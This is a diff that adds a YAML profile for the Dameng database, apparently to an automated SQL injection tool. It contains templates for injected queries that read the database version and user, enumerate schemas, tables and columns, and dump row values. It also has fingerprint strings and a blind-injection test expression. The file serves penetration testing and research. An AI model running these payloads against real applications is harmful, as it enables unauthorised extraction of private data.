@@ -1,0 +1,101 @@
+engine: Dameng
+clone: oracle.yml
+
+resource:
+ info: |
+  select
+      db_version
+      || '${enclose_value_sql}'
+      || name
+      || '${enclose_value_sql}'
+      || user
+      || '${trail_sql}'
+  from v%24instance
+
+ schema:
+  database: |
+   select
+       listagg(
+           '${enclose_value_sql}'
+           || s
+           || '${separator_qte_sql}0${enclose_value_sql}',
+           '${separator_cell_sql}'
+       ) within group (order by s) || '${trail_sql}'
+   from (
+       select t.s
+       from
+           (select distinct owner s from all_tables) t,
+           (select distinct owner s from all_tables) t1
+       where t.s >= t1.s
+       group by t.s
+       ${limit}
+   )
+
+  table: |
+   select
+       listagg(
+           '${enclose_value_sql}'
+           || s
+           || '${separator_qte_sql}0${enclose_value_sql}',
+           '${separator_cell_sql}'
+       ) within group (order by s) || '${trail_sql}'
+   from (
+       select t.s
+       from
+           (select distinct table_name s from all_tables where owner = '${database}') t,
+           (select distinct table_name s from all_tables where owner = '${database}') t1
+       where t.s >= t1.s
+       group by t.s
+       ${limit}
+   )
+
+  column: |
+   select
+       listagg(
+           '${enclose_value_sql}'
+           || s
+           || '${separator_qte_sql}0${enclose_value_sql}',
+           '${separator_cell_sql}'
+       ) within group (order by s) || '${trail_sql}'
+   from (
+       select t.s
+       from
+           (select distinct column_name s from all_tab_columns where owner = '${database}' and table_name = '${table}') t,
+           (select distinct column_name s from all_tab_columns where owner = '${database}' and table_name = '${table}') t1
+       where t.s >= t1.s
+       group by t.s
+       ${limit}
+   )
+
+  row:
+   query: |
+    select
+        listagg(
+            '${enclose_value_sql}'
+            || s
+            || '${separator_qte_sql}0${enclose_value_sql}',
+            '${separator_cell_sql}'
+        ) within group (order by s) || '${trail_sql}'
+    from (
+        select t.s
+        from
+            (select distinct ${fields} s from ${database}.${table}) t,
+            (select distinct ${fields} s from ${database}.${table}) t1
+        where t.s >= t1.s
+        group by t.s
+        ${limit}
+    )
+
+ exploit:
+
+strategy:
+ configuration:
+  fingerprint:
+   errorMessage:
+    - Integrated syntax item
+   orderByErrorMessage:
+    - Invalid order by clause
+   # limit to disambiguate from oracle
+   engineSpecific: "0 != bitand(case when ${test} then (select listagg(1) from dual limit 1) else '2' end, 1)"
+
+ error:
